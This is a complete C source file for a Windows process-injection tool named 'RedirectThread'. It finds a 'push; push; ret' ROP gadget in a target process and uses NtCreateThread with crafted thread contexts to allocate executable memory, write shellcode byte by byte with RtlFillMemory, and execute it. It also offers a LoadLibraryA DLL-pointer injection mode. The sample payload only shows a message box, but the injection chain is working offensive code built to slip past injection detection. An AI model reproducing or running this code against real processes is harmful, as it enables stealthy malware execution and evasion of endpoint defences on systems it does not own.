#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <psapi.h>

#pragma comment(lib, "ntdll.lib")

// NT Definitions
#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

typedef struct _INITIAL_TEB {
    PVOID StackBase;
    PVOID StackLimit;
    PVOID StackCommit;
    PVOID StackCommitMax;
    PVOID StackReserved;
} INITIAL_TEB, *PINITIAL_TEB;

typedef NTSTATUS (NTAPI *pNtCreateThread)(
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN HANDLE ProcessHandle,
    OUT PCLIENT_ID ClientId,
    IN PCONTEXT ThreadContext,
    IN PINITIAL_TEB InitialTeb,
    IN BOOLEAN CreateSuspended
);

// ROP Gadget Info
typedef struct _GADGET_INFO {
    LPVOID address;
    int regId1;
    int regId2;
} GADGET_INFO;

// Register IDs
#define REG_ID_INVALID -1
#define REG_ID_RAX 0
#define REG_ID_RBX 1
#define REG_ID_RBP 2
#define REG_ID_RSI 3
#define REG_ID_RDI 4
#define REG_ID_R10 10
#define REG_ID_R11 11
#define REG_ID_R12 12
#define REG_ID_R13 13
#define REG_ID_R14 14
#define REG_ID_R15 15

// Opcodes
#define REX_PREFIX 0x41
#define RET_OPCODE 0xC3
#define PUSH_RAX 0x50
#define PUSH_RBX 0x53
#define PUSH_RBP 0x55
#define PUSH_RSI 0x56
#define PUSH_RDI 0x57

// Helper: Get push instruction info
int GetPushInstructionInfo(const BYTE* instructionBytes, SIZE_T bytesAvailable, int* outRegisterId) {
    *outRegisterId = REG_ID_INVALID;
    if (bytesAvailable < 1) return 0;

    BYTE op1 = instructionBytes[0];

    switch (op1) {
        case PUSH_RAX: *outRegisterId = REG_ID_RAX; return 1;
        case PUSH_RBX: *outRegisterId = REG_ID_RBX; return 1;
        case PUSH_RBP: *outRegisterId = REG_ID_RBP; return 1;
        case PUSH_RSI: *outRegisterId = REG_ID_RSI; return 1;
        case PUSH_RDI: *outRegisterId = REG_ID_RDI; return 1;
    }

    if (op1 == REX_PREFIX && bytesAvailable >= 2) {
        BYTE op2 = instructionBytes[1];
        switch (op2) {
            case 0x52: *outRegisterId = REG_ID_R10; return 2;
            case 0x53: *outRegisterId = REG_ID_R11; return 2;
            case 0x54: *outRegisterId = REG_ID_R12; return 2;
            case 0x55: *outRegisterId = REG_ID_R13; return 2;
            case 0x56: *outRegisterId = REG_ID_R14; return 2;
            case 0x57: *outRegisterId = REG_ID_R15; return 2;
        }
    }
    return 0;
}

// Helper: Set register context value
BOOL SetRegisterContextValue(CONTEXT* context, int regId, DWORD64 value) {
    switch (regId) {
        case REG_ID_RAX: context->Rax = value; return TRUE;
        case REG_ID_RBX: context->Rbx = value; return TRUE;
        case REG_ID_RBP: context->Rbp = value; return TRUE;
        case REG_ID_RSI: context->Rsi = value; return TRUE;
        case REG_ID_RDI: context->Rdi = value; return TRUE;
        case REG_ID_R10: context->R10 = value; return TRUE;
        case REG_ID_R11: context->R11 = value; return TRUE;
        case REG_ID_R12: context->R12 = value; return TRUE;
        case REG_ID_R13: context->R13 = value; return TRUE;
        case REG_ID_R14: context->R14 = value; return TRUE;
        case REG_ID_R15: context->R15 = value; return TRUE;
        default: return FALSE;
    }
}

// Find "push r1; push r2; ret" gadget
GADGET_INFO FindUniquePushPushRetGadget(HANDLE hProcess) {
    GADGET_INFO foundGadget = {0};

    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    LPVOID searchAddress = sysInfo.lpMinimumApplicationAddress;
    LPVOID maxSearchAddress = sysInfo.lpMaximumApplicationAddress;

    MEMORY_BASIC_INFORMATION mbi;
    BYTE buffer[65536];

    while (searchAddress < maxSearchAddress &&
           VirtualQueryEx(hProcess, searchAddress, &mbi, sizeof(mbi)) == sizeof(mbi)) {

        ULONG_PTR regionEnd = (ULONG_PTR)mbi.BaseAddress + mbi.RegionSize;
        LPVOID nextSearchAddress = (LPVOID)regionEnd;

        BOOL isExecutable = (mbi.Protect & (PAGE_EXECUTE | PAGE_EXECUTE_READ |
                                           PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY)) != 0;
        BOOL isCommitted = (mbi.State == MEM_COMMIT);
        BOOL isGuarded = (mbi.Protect & PAGE_GUARD) != 0;

        if (isCommitted && isExecutable && !isGuarded && mbi.RegionSize > 0) {
            LPBYTE currentRegionPtr = (LPBYTE)mbi.BaseAddress;
            LPBYTE endRegionPtr = currentRegionPtr + mbi.RegionSize;

            while (currentRegionPtr < endRegionPtr) {
                SIZE_T bytesToRead = min(sizeof(buffer), (SIZE_T)(endRegionPtr - currentRegionPtr));
                SIZE_T bytesRead = 0;

                if (!ReadProcessMemory(hProcess, currentRegionPtr, buffer, bytesToRead, &bytesRead) ||
                    bytesRead == 0) {
                    break;
                }

                for (SIZE_T offset = 0; offset <= bytesRead - 3; ++offset) {
                    int regId1 = REG_ID_INVALID;
                    int push1Size = GetPushInstructionInfo(buffer + offset, bytesRead - offset, &regId1);
                    if (push1Size == 0 || regId1 == REG_ID_INVALID) continue;

                    SIZE_T push2Offset = offset + push1Size;
                    if (push2Offset > bytesRead - 2) continue;

                    int regId2 = REG_ID_INVALID;
                    int push2Size = GetPushInstructionInfo(buffer + push2Offset, bytesRead - push2Offset, &regId2);
                    if (push2Size == 0 || regId2 == REG_ID_INVALID) continue;
                    if (regId1 == regId2) continue; // Need unique registers

                    SIZE_T retOffset = push2Offset + push2Size;
                    if (retOffset >= bytesRead) continue;

                    if (buffer[retOffset] == RET_OPCODE) {
                        foundGadget.address = currentRegionPtr + offset;
                        foundGadget.regId1 = regId1;
                        foundGadget.regId2 = regId2;
                        printf("[+] Found ROP gadget at: 0x%llx (reg1=%d, reg2=%d)\n",
                               (ULONGLONG)foundGadget.address, regId1, regId2);
                        return foundGadget;
                    }
                }
                currentRegionPtr += bytesRead;
            }
        }
        searchAddress = nextSearchAddress;
    }

    printf("[-] Failed to find ROP gadget\n");
    return foundGadget;
}

// Allocate remote stack
BOOL AllocateRemoteStack(HANDLE hProcess, SIZE_T stackSize, PVOID* pStackBase, PVOID* pStackLimit) {
    PVOID pAlloc = VirtualAllocEx(hProcess, NULL, stackSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pAlloc) {
        printf("[-] Failed to allocate remote stack: %lu\n", GetLastError());
        return FALSE;
    }

    *pStackLimit = pAlloc;
    *pStackBase = (PVOID)((ULONG_PTR)pAlloc + stackSize);
    return TRUE;
}

// Create thread via NtCreateThread with ROP gadget
BOOL CreateRemoteThreadViaGadget(
    HANDLE hProcess,
    const GADGET_INFO* gadget,
    DWORD64 arg1, DWORD64 arg2, DWORD64 arg3, DWORD64 arg4,
    DWORD64 functionAddress,
    DWORD64 exitThreadAddr)
{
    // Get NtCreateThread
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        printf("[-] Failed to get ntdll.dll handle\n");
        return FALSE;
    }

    pNtCreateThread NtCreateThread = (pNtCreateThread)GetProcAddress(hNtdll, "NtCreateThread");
    if (!NtCreateThread) {
        printf("[-] Failed to get NtCreateThread address\n");
        return FALSE;
    }

    // Allocate stack
    PVOID stackBase = NULL, stackLimit = NULL;
    if (!AllocateRemoteStack(hProcess, 1024 * 1024, &stackBase, &stackLimit)) {
        return FALSE;
    }

    // Prepare initial TEB
    INITIAL_TEB initialTeb = {0};
    initialTeb.StackBase = stackBase;
    initialTeb.StackLimit = stackLimit;

    // Prepare thread context
    CONTEXT threadContext = {0};
    threadContext.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(GetCurrentThread(), &threadContext)) {
        printf("[-] Failed to get thread context: %lu\n", GetLastError());
        return FALSE;
    }

    // Set RIP to gadget address
    threadContext.Rip = (DWORD64)gadget->address;
    threadContext.Rsp = (DWORD64)stackBase;

    // Set registers for ROP gadget
    // gadget: push r1; push r2; ret
    // Stack will be: [r1] [r2] then ret will jump to r2
    // When r2 function returns, it will jump to r1 (ExitThread)
    if (!SetRegisterContextValue(&threadContext, gadget->regId1, exitThreadAddr)) {
        printf("[-] Failed to set register 1\n");
        return FALSE;
    }
    if (!SetRegisterContextValue(&threadContext, gadget->regId2, functionAddress)) {
        printf("[-] Failed to set register 2\n");
        return FALSE;
    }

    // Set function arguments
    threadContext.Rcx = arg1;
    threadContext.Rdx = arg2;
    threadContext.R8 = arg3;
    threadContext.R9 = arg4;

    threadContext.ContextFlags = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS;

    // Create thread
    HANDLE hThread = NULL;
    CLIENT_ID clientId = {0};

    NTSTATUS status = NtCreateThread(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        hProcess,
        &clientId,
        &threadContext,
        &initialTeb,
        FALSE
    );

    if (status != STATUS_SUCCESS) {
        printf("[-] NtCreateThread failed: 0x%lx\n", status);
        return FALSE;
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    return TRUE;
}

// Main injection function using NtCreateThread
BOOL InjectShellcodeUsingNtCreateThread(HANDLE hProcess, const BYTE* shellcode, SIZE_T shellcodeSize) {
    printf("[*] Starting NtCreateThread injection\n");

    // Find ROP gadget
    GADGET_INFO gadget = FindUniquePushPushRetGadget(hProcess);
    if (!gadget.address) {
        return FALSE;
    }

    // Get function addresses
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");

    LPVOID pVirtualAlloc = GetProcAddress(hKernel32, "VirtualAlloc");
    LPVOID pExitThread = GetProcAddress(hKernel32, "ExitThread");
    LPVOID pRtlFillMemory = GetProcAddress(hNtdll, "RtlFillMemory");

    if (!pVirtualAlloc || !pExitThread || !pRtlFillMemory) {
        printf("[-] Failed to get function addresses\n");
        return FALSE;
    }

    printf("[+] VirtualAlloc: 0x%llx\n", (ULONGLONG)pVirtualAlloc);
    printf("[+] ExitThread: 0x%llx\n", (ULONGLONG)pExitThread);
    printf("[+] RtlFillMemory: 0x%llx\n", (ULONGLONG)pRtlFillMemory);

    // Step 1: Allocate memory
    DWORD64 allocAddr = 0x60000;
    DWORD64 allocSize = (shellcodeSize + 0xFFF) & ~0xFFF; // Align to page
    DWORD64 allocType = MEM_COMMIT | MEM_RESERVE;
    DWORD64 allocProt = PAGE_EXECUTE_READWRITE;

    printf("[*] Step 1: Allocating memory at 0x%llx (size: %llu)\n", allocAddr, allocSize);

    if (!CreateRemoteThreadViaGadget(hProcess, &gadget,
                                      allocAddr, allocSize, allocType, allocProt,
                                      (DWORD64)pVirtualAlloc, (DWORD64)pExitThread)) {
        printf("[-] Failed to allocate memory\n");
        return FALSE;
    }

    printf("[+] Memory allocated successfully\n");

    // Step 2: Fill memory with shellcode (byte by byte using RtlFillMemory)
    printf("[*] Step 2: Writing shellcode (%llu bytes)\n", (ULONGLONG)shellcodeSize);

    for (SIZE_T i = 0; i < shellcodeSize; i++) {
        if (!CreateRemoteThreadViaGadget(hProcess, &gadget,
                                          allocAddr + i,              // Destination
                                          1,                          // Length
                                          (DWORD64)shellcode[i],      // Fill byte
                                          0,                          // Unused
                                          (DWORD64)pRtlFillMemory, (DWORD64)pExitThread)) {
            printf("[-] Warning: Failed to fill byte at offset %llu\n", (ULONGLONG)i);
        }

        if ((i + 1) % 10 == 0 || i == shellcodeSize - 1) {
            printf("\r  [*] Progress: %llu/%llu bytes written",
                   (ULONGLONG)(i + 1), (ULONGLONG)shellcodeSize);
            fflush(stdout);
        }
    }
    printf("\n[+] Shellcode written successfully\n");

    // Step 3: Execute shellcode
    printf("[*] Step 3: Executing shellcode\n");

    if (!CreateRemoteThreadViaGadget(hProcess, &gadget,
                                      0, 0, 0, 0,
                                      allocAddr,                  // Execute shellcode
                                      (DWORD64)pExitThread)) {
        printf("[-] Failed to execute shellcode\n");
        return FALSE;
    }

    printf("[+] Shellcode executed successfully\n");
    return TRUE;
}

// Simple DLL pointer injection (find "0" in ntdll)
BOOL InjectDllPointerOnly(DWORD pid, const char* dllName) {
    printf("[*] DLL Pointer Injection for: %s\n", dllName);

    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
                                   FALSE, pid);
    if (!hProcess) {
        printf("[-] Failed to open process: %lu\n", GetLastError());
        return FALSE;
    }

    // Get LoadLibraryA address
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    LPVOID pLoadLibraryA = GetProcAddress(hKernel32, "LoadLibraryA");
    if (!pLoadLibraryA) {
        printf("[-] Failed to get LoadLibraryA address\n");
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] LoadLibraryA: 0x%llx\n", (ULONGLONG)pLoadLibraryA);

    // Find the character in target process memory
    // For "0.dll", we need to find "0\0" string
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    MEMORY_BASIC_INFORMATION mbi;
    LPVOID pTargetString = NULL;

    for (LPVOID addr = hNtdll;
         VirtualQuery(addr, &mbi, sizeof(mbi)) == sizeof(mbi);
         addr = (LPVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize)) {

        if (mbi.State == MEM_COMMIT && (mbi.Protect & PAGE_READONLY)) {
            BYTE* buffer = (BYTE*)malloc(mbi.RegionSize);
            if (!buffer) continue;

            memcpy(buffer, mbi.BaseAddress, mbi.RegionSize);

            for (SIZE_T i = 0; i < mbi.RegionSize - strlen(dllName) - 1; i++) {
                if (memcmp(buffer + i, dllName, strlen(dllName)) == 0 &&
                    buffer[i + strlen(dllName)] == 0) {
                    pTargetString = (LPVOID)((DWORD_PTR)mbi.BaseAddress + i);
                    free(buffer);
                    goto found;
                }
            }
            free(buffer);
        }
    }

found:
    if (!pTargetString) {
        printf("[-] Failed to find '%s' in ntdll.dll memory\n", dllName);
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] Found '%s' at: 0x%llx\n", dllName, (ULONGLONG)pTargetString);
    printf("[*] Creating remote thread: LoadLibraryA(\"%s\")\n", dllName);

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                                        (LPTHREAD_START_ROUTINE)pLoadLibraryA,
                                        pTargetString, 0, NULL);
    if (!hThread) {
        printf("[-] Failed to create remote thread: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }

    WaitForSingleObject(hThread, INFINITE);

    printf("[+] DLL injection completed\n");

    CloseHandle(hThread);
    CloseHandle(hProcess);
    return TRUE;
}

// Simple MessageBox shellcode (x64)
unsigned char g_MessageBoxShellcode[] = {
    // MessageBoxA(NULL, "Redirected!", "ROP Success", MB_OK)
    0x48, 0x83, 0xEC, 0x28,                         // sub rsp, 0x28
    0x48, 0x31, 0xC9,                               // xor rcx, rcx
    0x48, 0x8D, 0x15, 0x1E, 0x00, 0x00, 0x00,      // lea rdx, [rip+message]
    0x4C, 0x8D, 0x05, 0x27, 0x00, 0x00, 0x00,      // lea r8, [rip+title]
    0x45, 0x31, 0xC9,                               // xor r9d, r9d
    0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // movabs rax, MessageBoxA
    0xFF, 0xD0,                                     // call rax
    0x48, 0x83, 0xC4, 0x28,                         // add rsp, 0x28
    0xC3,                                           // ret
    // Message
    'R', 'e', 'd', 'i', 'r', 'e', 'c', 't', 'e', 'd', '!', 0x00,
    // Title
    'R', 'O', 'P', ' ', 'S', 'u', 'c', 'c', 'e', 's', 's', 0x00
};

int main(int argc, char* argv[]) {
    printf("========================================\n");
    printf("RedirectThread - Context-Only Injection\n");
    printf("========================================\n\n");

    if (argc < 3) {
        printf("Usage:\n");
        printf("  %s --dll-pointer <PID> <DLL_NAME>\n", argv[0]);
        printf("  %s --ntcreatethread <PID>\n\n", argv[0]);
        printf("Examples:\n");
        printf("  %s --dll-pointer 1234 0.dll\n", argv[0]);
        printf("  %s --ntcreatethread 1234\n", argv[0]);
        return 1;
    }

    if (strcmp(argv[1], "--dll-pointer") == 0) {
        if (argc < 4) {
            printf("[-] DLL name required\n");
            return 1;
        }
        DWORD pid = atoi(argv[2]);
        const char* dllName = argv[3];

        if (InjectDllPointerOnly(pid, dllName)) {
            printf("\n[+] Injection successful!\n");
            return 0;
        }
    }
    else if (strcmp(argv[1], "--ntcreatethread") == 0) {
        DWORD pid = atoi(argv[2]);

        HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
                                     PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
                                     FALSE, pid);
        if (!hProcess) {
            printf("[-] Failed to open process: %lu\n", GetLastError());
            return 1;
        }

        // Patch MessageBoxA address
        HMODULE hUser32 = LoadLibraryA("user32.dll");
        PVOID pMessageBoxA = GetProcAddress(hUser32, "MessageBoxA");
        memcpy(g_MessageBoxShellcode + 0x1A, &pMessageBoxA, sizeof(PVOID));

        if (InjectShellcodeUsingNtCreateThread(hProcess, g_MessageBoxShellcode,
                                               sizeof(g_MessageBoxShellcode))) {
            printf("\n[+] Injection successful!\n");
            CloseHandle(hProcess);
            return 0;
        }

        CloseHandle(hProcess);
    }
    else {
        printf("[-] Unknown option: %s\n", argv[1]);
        return 1;
    }

    printf("\n[-] Injection failed!\n");
    return 1;
}
